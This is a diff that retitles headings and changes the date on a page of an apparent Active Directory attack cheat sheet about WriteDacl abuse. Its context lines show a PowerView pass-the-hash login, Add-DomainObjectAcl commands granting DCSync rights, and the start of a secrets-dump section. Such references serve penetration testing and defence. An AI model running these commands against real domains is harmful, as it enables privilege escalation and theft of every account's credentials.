@@ -1,10 +1,10 @@
 ---
 title: "WriteDacl"
-date: 2024-7-12
+date: 2025-7-25
 tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directory", "Windows"]
 ---
 
-### Abuse #1: Add dcsync right to user
+### Abuse #1: Add DCsync Right to User
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -30,7 +30,7 @@ $ powerview 'CORP.LOCAL/WEB01$@172.16.1.5' -H 7ddf32e17a6ac5ce04a8ecbf782ca509
 PV > 
 ```
 
-#### 2. Add dcsync right
+#### 2. Add DCsync Right
 
 ```console
 Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
@@ -58,7 +58,7 @@ PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (Runas) \[Optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -72,7 +72,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-#### 3. Add dcsync right
+#### 3. Add DCsync Right
 
 ```console
 Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync -Credential $cred
@@ -84,7 +84,7 @@ Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTIT
 
 {{< /tabcontent >}}
 
-#### Secrets dump
+#### Secrets Dump
 
 {{< tab set2 tab1 >}}impacket{{< /tab >}}
 {{< tab set2 tab2 >}}nxc{{< /tab >}}
